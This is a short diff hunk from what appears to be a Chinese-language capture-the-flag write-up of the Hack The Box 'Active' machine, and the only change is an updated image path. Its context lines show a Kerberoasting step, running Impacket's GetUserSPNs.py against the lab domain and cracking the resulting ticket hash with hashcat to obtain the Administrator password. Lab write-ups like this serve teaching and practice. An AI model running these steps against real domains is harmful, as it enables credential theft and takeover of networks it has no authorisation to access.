@@ -154,7 +154,7 @@ serviceprincipalname | grep -B 1 servicePrincipalName
 python3 GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.138.113 -request
 ```
 
-<figure><img src="../../.gitbook/assets/25 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/25 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 将输出的哈希值存为hash.txt文件，然后用hashcat对它进行爆破以获取Administrator的明文密码：
 
